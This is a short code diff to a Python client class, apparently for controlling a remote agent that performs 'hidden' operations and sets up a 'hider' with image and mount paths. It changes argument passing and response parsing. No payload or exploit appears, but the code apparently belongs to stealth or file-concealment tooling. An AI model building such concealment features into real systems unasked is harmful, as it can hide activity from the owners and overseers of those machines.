@@ -17,6 +17,7 @@ class Agent:
         self.type = type
         self.mountedFS = False
         self.mountPath = "DefaultMount"  # so its obviuos when debugging
+        self.is_hider_active = False
 
     def __repr__(self) -> str:
         return f"Agent(self.conn={self.conn}, self.type={self.type})"
@@ -71,14 +72,15 @@ class Agent:
         res = self.conn.recv_responce_struct()
         return res, file_data
 
-    def hidden_action_without_upload(self, fncode: FunCode) -> tuple[Responce, str]:
+    def hidden_action_without_upload(self, fncode: FunCode, targetPath: str) -> tuple[Responce, str]:
         assert FunCode.HIDDEN_UPLOAD not in fncode
 
-        self.conn.send_command(Command(0, FunCode.HIDDEN_OPRATION | fncode, 0, ""))
+        self.conn.send_command(Command(0, FunCode.HIDDEN_OPRATION | fncode, 0, targetPath))
         results = list()
-        results.append(self.conn.recv_bytes(Status.sizeof))
-        results.append(self.conn.recv_bytes(Status.sizeof))
-        results.append(self.conn.recv_bytes(Status.sizeof))
+        results.append(self.conn.recv_responce_struct())
+        results.append(self.conn.recv_responce_struct())
+        results.append(self.conn.recv_responce_struct())
+        # results.append(self.conn.recv_bytes(Status.sizeof))
         return self.conn.recv_full_responce(), results
 
     def hidden_action_with_upload(
@@ -108,6 +110,7 @@ class Agent:
     def hider_setup(
         self, hiderPath: str, imagePath: str, mountPath: str
     ) -> tuple[Responce, str]:
+        self.is_hider_active = True
         self.mountPath = mountPath
         # self.hiding_env_setup(imagePath)
 
